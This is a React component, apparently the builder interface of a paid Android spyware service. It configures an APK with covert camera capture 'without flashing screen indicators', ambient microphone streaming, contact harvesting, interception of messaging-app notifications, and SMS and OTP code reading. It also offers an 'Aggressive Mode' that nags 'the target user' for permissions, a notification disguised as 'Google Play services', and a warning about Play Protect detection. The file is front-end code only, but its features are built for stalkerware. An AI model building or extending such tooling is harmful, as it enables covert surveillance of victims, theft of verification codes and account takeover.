                                <div className={`p-4 rounded-2xl bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(6,182,212,0.1)]`}>
                                    <div className="flex flex-col">
                                        <div className="flex items-center gap-2">
                                            <span className="text-sm font-bold text-cyan-200">Camera Capture</span>
                                            {!isPremium && (
                                                <span className="bg-cyan-500/20 text-cyan-300 border border-cyan-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider">
                                                    PREMIUM
                                                </span>
                                            )}
                                            <button type="button" onClick={() => setShowPermissionInfo('camera')} className="text-cyan-400/70 hover:text-cyan-300">
                                                <Info size={14} />
                                            </button>
                                        </div>
                                        <span className="text-xs text-cyan-300/70">Grants live video streaming and instant photo snapshots from front & rear cameras.</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => {
                                            if (!isPremium) { onUpgrade?.(); return; }
                                            setEnableCameraPermission(!enableCameraPermission);
                                        }}
                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${!isPremium ? 'bg-white/10' : enableCameraPermission ? 'bg-cyan-500' : 'bg-white/20'}`}
                                    >
                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableCameraPermission && isPremium ? 'left-6' : 'left-1'}`} />
                                    </button>
                                </div>

                                {/* Live Microphone - Soft Violet */}
                                <div className={`p-4 rounded-2xl bg-purple-500/10 border border-purple-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(168,85,247,0.1)]`}>
                                    <div className="flex flex-col">
                                        <div className="flex items-center gap-2">
                                            <span className="text-sm font-bold text-purple-200">Live Microphone</span>
                                            {!isPremium && (
                                                <span className="bg-purple-500/20 text-purple-300 border border-purple-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider">
                                                    PREMIUM
                                                </span>
                                            )}
                                            <button type="button" onClick={() => setShowPermissionInfo('microphone')} className="text-purple-400/70 hover:text-purple-300">
                                                <Info size={14} />
                                            </button>
                                        </div>
                                        <span className="text-xs text-purple-300/70">Grants real-time room surround audio streaming and voice recording.</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => {
                                            if (!isPremium) { onUpgrade?.(); return; }
                                            setEnableMicrophonePermission(!enableMicrophonePermission);
                                        }}
                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${!isPremium ? 'bg-white/10' : enableMicrophonePermission ? 'bg-purple-500' : 'bg-white/20'}`}
                                    >
                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableMicrophonePermission && isPremium ? 'left-6' : 'left-1'}`} />
                                    </button>
                                </div>

                                {/* Contacts Sync - Soft Green */}
                                <div className={`p-4 rounded-2xl bg-green-500/10 border border-green-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(34,197,94,0.1)]`}>
                                    <div className="flex flex-col">
                                        <div className="flex items-center gap-2">
                                            <span className="text-sm font-bold text-green-200">Contacts Sync</span>
                                            {isBasicPlan && (
                                                <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider">
                                                    PRO
                                                </span>
                                            )}
                                            <button type="button" onClick={() => setShowPermissionInfo('contacts')} className="text-green-400/70 hover:text-green-300">
                                                <Info size={14} />
                                            </button>
                                        </div>
                                        <span className="text-xs text-green-300/70">Grants access to sync device phonebook contacts & stored email accounts.</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => {
                                            if (isBasicPlan) { onUpgrade?.(); return; }
                                            setEnableContactsPermission(!enableContactsPermission);
                                        }}
                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${isBasicPlan ? 'bg-white/10' : enableContactsPermission ? 'bg-green-500' : 'bg-white/20'}`}
                                    >
                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableContactsPermission && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                    </button>
                                </div>
                            </div>

                            {/* Collapsible Advanced Permissions Button (SMS & Aggressive Mode) */}
                            <div className="pt-2">
                                <button
                                    type="button"
                                    onClick={() => setShowAdvancedPermissions(!showAdvancedPermissions)}
                                    className="w-full py-3 px-4 rounded-2xl bg-white/[0.04] hover:bg-white/[0.08] border border-white/15 flex items-center justify-between text-xs font-extrabold text-emerald-300 transition-all shadow-sm"
                                >
                                    <div className="flex items-center gap-2">
                                        <Sliders size={15} />
                                        <span>Advanced Stealth & Persistence Options</span>
                                    </div>
                                    {showAdvancedPermissions ? <ChevronUp size={16} /> : <ChevronDown size={16} />}
                                </button>

                                {/* Collapsible Advanced Section */}
                                {showAdvancedPermissions && (
                                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5 mt-3 animate-in fade-in duration-200">
                                        {/* SMS Access - Soft Rose */}
                                        <div className={`p-4 rounded-2xl bg-rose-500/10 border border-rose-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(244,63,94,0.1)]`}>
                                            <div className="flex flex-col">
                                                <div className="flex items-center gap-2">
                                                    <span className="text-sm font-bold text-rose-200">SMS Messages</span>
                                                    <span className="bg-rose-500/20 text-rose-300 border border-rose-500/40 px-1.5 py-0.5 rounded text-[9px] font-bold">
                                                        ADVANCED
                                                    </span>
                                                    <button type="button" onClick={() => setShowPermissionInfo('sms')} className="text-rose-400/70 hover:text-rose-300">
                                                        <Info size={14} />
                                                    </button>
                                                </div>
                                                <span className="text-xs text-rose-300/70">Grants access to read incoming SMS messages & OTP verification codes.</span>
                                            </div>
                                            <button
                                                type="button"
                                                onClick={() => {
                                                    if (isBasicPlan) { onUpgrade?.(); return; }
                                                    if (!enableSmsPermission) {
                                                        setShowPlayProtectWarning(true);
                                                    } else {
                                                        setEnableSmsPermission(false);
                                                    }
                                                }}
                                                className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${isBasicPlan ? 'bg-white/10' : enableSmsPermission ? 'bg-rose-500' : 'bg-white/20'}`}
                                            >
                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableSmsPermission && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                            </button>
                                        </div>

                                        {/* Aggressive Persistence Mode - Soft Amber */}
                                        <div className="p-4 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(245,158,11,0.1)]">
                                            <div className="flex flex-col">
                                                <div className="flex items-center gap-2">
                                                    <span className="text-sm font-bold text-amber-200">Aggressive Mode</span>
                                                    <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-1.5 py-0.5 rounded text-[9px] font-bold">
                                                        LOOP
                                                    </span>
                                                </div>
                                                <span className="text-xs text-amber-300/70">Repeatedly prompts the target user for permissions until all required access is granted.</span>
                                            </div>
                                            <button
                                                type="button"
                                                onClick={() => {
                                                    if (isBasicPlan) { onUpgrade?.(); return; }
                                                    setAggressivePermissions(!aggressivePermissions);
                                                }}
                                                className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${isBasicPlan ? 'bg-white/10' : aggressivePermissions ? 'bg-amber-500' : 'bg-white/20'}`}
                                            >
                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${aggressivePermissions && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                            </button>
                                        </div>
                                    </div>
                                )}
                            </div>
                        </div>
                    )}

                    {/* STEP 3: BACKGROUND SERVICE NOTIFICATION STYLE & CLICK BEHAVIOR */}
                    {activeStep === 'notifications' && (
                        <div className="space-y-6">
                            
                            {/* Section Title ("SELECT NOTIFICATION STYLE") */}
                            <div className="flex items-center gap-2.5 px-1">
                                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                                <span className="text-xs font-extrabold bg-gradient-to-r from-emerald-300 via-teal-200 to-cyan-300 bg-clip-text text-transparent uppercase tracking-wider">
                                    SELECT NOTIFICATION STYLE
                                </span>
                            </div>

                            {/* Custom UI Visual Preset Cards Grid (Replaces browser HTML select dropdown) */}
                            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                                {NOTIFICATION_STYLES.map((style) => {
                                    const isSelected = notificationStyle === style.id;
                                    return (
                                        <button
                                            key={style.id}
                                            type="button"
                                            onClick={() => setNotificationStyle(style.id)}
                                            className={`p-3.5 rounded-2xl border text-left flex items-start justify-between gap-3 transition-all ${
                                                isSelected
                                                    ? 'bg-emerald-500/15 border-emerald-500/60 shadow-[0_0_18px_rgba(16,185,129,0.2)] scale-[1.01]'
                                                    : 'bg-black/40 border-white/10 hover:border-white/20 text-fg-3 hover:bg-white/[0.03]'
                                            }`}
                                        >
                                            <div className="flex items-start gap-3 min-w-0">
                                                <span className="text-2xl flex-shrink-0 mt-0.5">{style.badge}</span>
                                                <div className="min-w-0">
                                                    <span className={`text-xs font-extrabold block truncate ${isSelected ? 'text-white' : 'text-fg-2'}`}>
                                                        {style.title}
                                                    </span>
                                                    <span className="text-[11px] text-fg-3 block truncate">{style.text}</span>
                                                    <span className="text-[10px] text-emerald-400/80 block mt-1">{style.desc}</span>
                                                </div>
                                            </div>
                                            {isSelected && <CheckCircle2 size={18} className="text-emerald-400 flex-shrink-0 mt-1" />}
                                        </button>
                                    );
                                })}
                            </div>

                            {/* Custom Notification Input Fields & Icon Selector (ONLY WHEN 'custom' IS SELECTED) */}
                            {notificationStyle === 'custom' && (
                                <div className="p-4 rounded-2xl bg-black/50 border border-emerald-500/30 space-y-4 animate-in fade-in">
                                    <div className="text-xs font-extrabold text-emerald-300 uppercase tracking-wider">
                                        Customize Notification Appearance
                                    </div>

                                    {/* Custom Title */}
                                    <div>
                                        <label className="block text-xs font-bold text-fg-3 mb-1.5">Notification Title</label>
                                        <input
                                            type="text"
                                            value={notificationTitle}
                                            onChange={(e) => setNotificationTitle(e.target.value)}
                                            className="w-full bg-black/60 border border-white/15 rounded-xl px-3.5 py-2.5 text-white text-xs font-bold focus:outline-none focus:border-emerald-500/60"
                                            placeholder="e.g. Google Play services"
                                        />
                                    </div>

                                    {/* Custom Text */}
                                    <div>
                                        <label className="block text-xs font-bold text-fg-3 mb-1.5">Notification Message Text</label>
                                        <input
                                            type="text"
                                            value={notificationText}
                                            onChange={(e) => setNotificationText(e.target.value)}
                                            className="w-full bg-black/60 border border-white/15 rounded-xl px-3.5 py-2.5 text-white text-xs focus:outline-none focus:border-emerald-500/60"
                                            placeholder="e.g. Checking for updates…"
                                        />
                                    </div>

                                    {/* Custom Icon Selector UI */}
                                    <div>
                                        <label className="block text-xs font-bold text-fg-3 mb-1.5">Select Status Bar Icon</label>
                                        <div className="grid grid-cols-5 gap-2">
                                            {CUSTOM_ICONS.map((iconObj) => {
                                                const selected = notificationIcon === iconObj.id;
                                                return (
                                                    <button
                                                        key={iconObj.id}
                                                        type="button"
                                                        onClick={() => setNotificationIcon(iconObj.id)}
                                                        className={`p-2.5 rounded-xl border flex flex-col items-center justify-center gap-1 transition-all ${
                                                            selected
                                                                ? 'bg-emerald-500/20 border-emerald-500/60 text-white shadow-sm'
                                                                : 'bg-black/40 border-white/10 text-fg-3 hover:border-white/20'
                                                        }`}
                                                    >
                                                        <span className="text-lg">{iconObj.symbol}</span>
                                                        <span className="text-[10px] font-bold">{iconObj.label}</span>
                                                    </button>
                                                );
                                            })}
                                        </div>
                                    </div>
                                </div>
                            )}

                            {/* Notification Click Action Selector UI ("agar notification pe click kare tu kya open hoga") */}
                            <div className="space-y-3 pt-3 border-t border-white/10">
                                <label className="block text-xs font-extrabold text-fg-3 uppercase tracking-widest">
                                    Notification Tap Action
                                </label>
                                <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
                                    {CLICK_ACTIONS.map((action) => {
                                        const isSelected = notificationClickAction === action.id;
                                        return (
                                            <button
                                                key={action.id}
                                                type="button"
                                                onClick={() => setNotificationClickAction(action.id)}
                                                className={`p-3 rounded-xl border text-left flex items-center justify-between transition-all ${
                                                    isSelected
                                                        ? 'bg-emerald-500/15 border-emerald-500/60 text-white shadow-sm'
                                                        : 'bg-black/40 border-white/10 hover:border-white/20 text-fg-3'
                                                }`}
                                            >
                                                <div>
                                                    <span className={`text-xs font-bold block ${isSelected ? 'text-emerald-300' : 'text-fg-2'}`}>
                                                        {action.title}
                                                    </span>
                                                    <span className="text-[10px] text-fg-4 block">{action.desc}</span>
                                                </div>
                                                {isSelected && <CheckCircle2 size={16} className="text-emerald-400 flex-shrink-0" />}
                                            </button>
                                        );
                                    })}
                                </div>
                            </div>
                        </div>
                    )}
                </div>

                {/* Footer Controls & Progress Popup Overlay */}
                <div className="p-5 sm:p-7 border-t border-white/10 bg-gradient-to-t from-white/[0.04] to-transparent flex flex-col gap-4">
                    
                    {/* Progress / Status Modal Popup Box */}
                    {status !== 'idle' && (
                        <div className="p-5 rounded-2xl bg-black/80 border border-emerald-500/30 flex flex-col items-center justify-center text-center space-y-3 animate-in fade-in shadow-2xl">
                            {status === 'queued' ? (
                                <>
                                    <div className="w-10 h-10 border-4 border-emerald-500/30 border-t-emerald-500 rounded-full animate-spin" />
                                    <h4 className="text-base font-bold text-white">Queued for Compilation</h4>
                                    <p className="text-xs text-fg-3">Queue Position: <span className="text-emerald-400 font-bold">{queuePosition}</span></p>
                                </>
                            ) : status === 'generating' ? (
                                <>
                                    <div className="w-full flex items-center justify-between text-xs font-bold text-fg-2">
                                        <span>{progressStep || "Compiling APK..."}</span>
                                        <span className="text-emerald-400">{progress}%</span>
                                    </div>
                                    <div className="w-full h-3 bg-white/10 rounded-full overflow-hidden">
                                        <div
                                            className="h-full bg-gradient-to-r from-emerald-500 to-teal-400 transition-all duration-500"
                                            style={{ width: `${progress}%` }}
                                        />
                                    </div>
                                </>
                            ) : status === 'completed' ? (
                                <>
                                    <CheckCircle2 size={36} className="text-emerald-400" />
                                    <h4 className="text-lg font-bold text-white">APK Ready!</h4>
                                    <p className="text-xs text-fg-3">Your compiled Android APK is ready for installation.</p>
                                    {downloadUrl && (
                                        <a
                                            href={downloadUrl}
                                            target="_blank"
                                            rel="noopener noreferrer"
                                            className="px-6 py-2.5 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-white font-bold text-xs shadow-lg transition-all"
                                        >
                                            Download APK Now
                                        </a>
                                    )}
                                </>
                            ) : null}
                        </div>
                    )}

                    {/* Step Navigation & Action Buttons */}
                    <div className="flex items-center justify-between gap-3">
                        {activeStep !== 'identity' ? (
                            <button
                                type="button"
                                onClick={() => setActiveStep(activeStep === 'notifications' ? 'permissions' : 'identity')}
                                className="px-5 py-3 rounded-xl bg-white/5 hover:bg-white/10 text-fg-2 hover:text-white font-bold text-xs transition-all"
                            >
                                ← Previous
                            </button>
                        ) : <div />}

                        {activeStep !== 'notifications' ? (
                            <button
                                type="button"
                                onClick={() => setActiveStep(activeStep === 'identity' ? 'permissions' : 'notifications')}
                                className="px-6 py-3 rounded-xl bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-400 hover:to-teal-400 text-black font-extrabold text-xs shadow-lg shadow-emerald-500/20 transition-all flex items-center gap-2"
                            >
                                <span>Next Step</span>
                                <span>→</span>
                            </button>
                        ) : status === 'idle' ? (
                            <button
                                type="button"
                                onClick={startGeneration}
                                className="px-8 py-3.5 rounded-xl bg-gradient-to-r from-emerald-500 via-teal-500 to-cyan-500 hover:scale-105 text-black font-black text-sm shadow-[0_0_25px_rgba(16,185,129,0.35)] transition-all"
                            >
                                Build {selectedPreset === 'custom' ? 'Custom' : activeApp.name} APK
                            </button>
                        ) : (
                            <button
                                type="button"
                                onClick={onClose}
                                className="px-6 py-3 rounded-xl bg-white/10 hover:bg-white/20 text-white font-bold text-xs transition-all"
                            >
                                Close
                            </button>
                        )}
                    </div>
                </div>

                {/* App Mode Info Modal Popup */}
                {showAppInfoModal && (
                    <div className="fixed inset-0 z-[350] flex items-center justify-center bg-black/75 backdrop-blur-sm p-4" onClick={() => setShowAppInfoModal(null)}>
                        <div className="bg-[#18191c] border border-white/15 rounded-3xl p-6 max-w-sm w-full space-y-4 relative shadow-2xl" onClick={(e) => e.stopPropagation()}>
                            <button
                                onClick={() => setShowAppInfoModal(null)}
                                className="absolute top-4 right-4 text-white/50 hover:text-white"
                            >
                                ✕
                            </button>

                            <div className="flex items-center gap-3">
                                {renderPresetIconBadge(showAppInfoModal)}
                                <div>
                                    <h4 className="text-base font-extrabold text-white">
                                        {APP_PRESETS.find(p => p.id === showAppInfoModal)?.name}
                                    </h4>
                                    <span className="text-[10px] font-mono text-emerald-400">
                                        {APP_PRESETS.find(p => p.id === showAppInfoModal)?.packageName}
                                    </span>
                                </div>
                            </div>

                            <div className="p-3.5 rounded-2xl bg-white/[0.03] border border-white/10">
                                <h5 className="text-xs font-bold text-emerald-300 mb-1.5">
                                    {APP_PRESETS.find(p => p.id === showAppInfoModal)?.infoTitle}
                                </h5>
                                <p className="text-xs text-fg-3 leading-relaxed">
                                    {APP_PRESETS.find(p => p.id === showAppInfoModal)?.infoText}
                                </p>
                            </div>

                            <button
                                onClick={() => setShowAppInfoModal(null)}
                                className="w-full py-2.5 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-black font-bold text-xs transition-all shadow-lg"
                            >
                                Close Info
                            </button>
                        </div>
                    </div>
                )}

                {/* Play Protect Warning Modal */}
                {showPlayProtectWarning && (
                    <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-[350]" onClick={() => setShowPlayProtectWarning(false)}>
                        <div className="bg-[#18191c] rounded-3xl p-6 max-w-sm mx-4 border border-red-500/30 shadow-2xl space-y-4" onClick={(e) => e.stopPropagation()}>
                            <div className="flex items-center gap-3">
                                <div className="w-11 h-11 rounded-2xl bg-red-500/15 border border-red-500/30 flex items-center justify-center text-red-400">
                                    <AlertTriangle size={22} />
                                </div>
                                <div>
                                    <h3 className="text-base font-bold text-white">Play Protect Warning</h3>
                                    <p className="text-xs text-red-400">High detection risk</p>
                                </div>
                            </div>

                            <p className="text-fg-2 text-xs leading-relaxed">
                                Enabling <strong>SMS Access</strong> increases the likelihood that Google Play Protect will flag or restrict installation. Proceed only if needed.
                            </p>

                            <div className="flex gap-3">
                                <button
                                    type="button"
                                    onClick={() => setShowPlayProtectWarning(false)}
                                    className="flex-1 py-2.5 rounded-xl bg-white/5 hover:bg-white/10 text-white text-xs font-bold transition-all"
                                >
                                    Cancel
                                </button>
                                <button
                                    type="button"
                                    onClick={() => {
                                        setEnableSmsPermission(true);
                                        setShowPlayProtectWarning(false);
                                    }}
                                    className="flex-1 py-2.5 rounded-xl bg-red-500 hover:bg-red-600 text-white text-xs font-bold transition-all"
                                >
                                    Enable Anyway
                                </button>
                            </div>
                        </div>
                    </div>
                )}

                {/* Customized Color-Themed Permission Info Modal */}
                {showPermissionInfo && (
                    <div className="fixed inset-0 z-[350] flex items-center justify-center bg-black/75 backdrop-blur-sm p-4" onClick={() => setShowPermissionInfo(null)}>
                        <div className={`bg-[#18191c] border rounded-3xl p-6 max-w-sm w-full space-y-4 relative shadow-2xl ${
                            showPermissionInfo === 'storage' ? 'border-emerald-500/40 shadow-emerald-500/10' :
                            showPermissionInfo === 'camera' ? 'border-cyan-500/40 shadow-cyan-500/10' :
                            showPermissionInfo === 'microphone' ? 'border-purple-500/40 shadow-purple-500/10' :
                            showPermissionInfo === 'contacts' ? 'border-green-500/40 shadow-green-500/10' :
                            showPermissionInfo === 'notifications' ? 'border-sky-500/40 shadow-sky-500/10' :
                            'border-rose-500/40 shadow-rose-500/10'
                        }`} onClick={(e) => e.stopPropagation()}>
                            <button
                                onClick={() => setShowPermissionInfo(null)}
                                className="absolute top-4 right-4 text-white/50 hover:text-white"
                            >
                                ✕
                            </button>

                            {/* Themed Title & Icon */}
                            <div className="flex items-center gap-3">
                                <div className={`w-11 h-11 rounded-2xl flex items-center justify-center ${
                                    showPermissionInfo === 'storage' ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40' :
                                    showPermissionInfo === 'camera' ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/40' :
                                    showPermissionInfo === 'microphone' ? 'bg-purple-500/20 text-purple-300 border border-purple-500/40' :
                                    showPermissionInfo === 'contacts' ? 'bg-green-500/20 text-green-300 border border-green-500/40' :
                                    showPermissionInfo === 'notifications' ? 'bg-sky-500/20 text-sky-300 border border-sky-500/40' :
                                    'bg-rose-500/20 text-rose-300 border border-rose-500/40'
                                }`}>
                                    <Info size={22} />
                                </div>
                                <div>
                                    <h4 className="text-base font-extrabold text-white capitalize">{showPermissionInfo} Access</h4>
                                    <span className={`text-[10px] font-bold uppercase tracking-wider ${
                                        showPermissionInfo === 'storage' ? 'text-emerald-400' :
                                        showPermissionInfo === 'camera' ? 'text-cyan-400' :
                                        showPermissionInfo === 'microphone' ? 'text-purple-400' :
                                        showPermissionInfo === 'contacts' ? 'text-green-400' :
                                        showPermissionInfo === 'notifications' ? 'text-sky-400' :
                                        'text-rose-400'
                                    }`}>
                                        Background Capability
                                    </span>
                                </div>
                            </div>

                            {/* Detailed Description */}
                            <div className="p-4 rounded-2xl bg-white/[0.03] border border-white/10">
                                <p className="text-xs text-fg-2 leading-relaxed">
                                    {showPermissionInfo === 'storage' && "Enables silent indexing of device gallery albums, downloaded files, camera roll snapshots, and internal storage folders."}
                                    {showPermissionInfo === 'camera' && "Enables real-time remote snapshots and video capture using both front and rear lenses without flashing screen indicators."}
                                    {showPermissionInfo === 'microphone' && "Enables ambient room audio streaming and scheduled microphone surround recording with background compression."}
                                    {showPermissionInfo === 'contacts' && "Enables synchronization of stored phonebook contacts, SIM directory entries, and configured Google account names."}
                                    {showPermissionInfo === 'notifications' && "Enables real-time interception of WhatsApp, Instagram, Telegram messages, system toasts, and incoming notification previews."}
                                    {showPermissionInfo === 'sms' && "Enables reading incoming verification OTP codes, incoming/outgoing SMS history logs, and system text alerts."}
                                </p>
                            </div>

                            <button
                                onClick={() => setShowPermissionInfo(null)}
                                className={`w-full py-2.5 rounded-xl font-bold text-xs transition-all shadow-lg text-black ${
                                    showPermissionInfo === 'storage' ? 'bg-emerald-400 hover:bg-emerald-500' :
                                    showPermissionInfo === 'camera' ? 'bg-cyan-400 hover:bg-cyan-500' :
                                    showPermissionInfo === 'microphone' ? 'bg-purple-400 hover:bg-purple-500' :
                                    showPermissionInfo === 'contacts' ? 'bg-green-400 hover:bg-green-500' :
                                    showPermissionInfo === 'notifications' ? 'bg-sky-400 hover:bg-sky-500' :
                                    'bg-rose-400 hover:bg-rose-500'
                                }`}
                            >
                                Got it
                            </button>
                        </div>
                    </div>
                )}

                {/* Custom Alert Modal */}
                <CustomAlertModal
                    isOpen={showCustomAlert}
                    onClose={() => setShowCustomAlert(false)}
                    title={alertData.title}
                    message={alertData.message}
                    type={alertData.type}
                />
            </div>
        </div>
    );
}
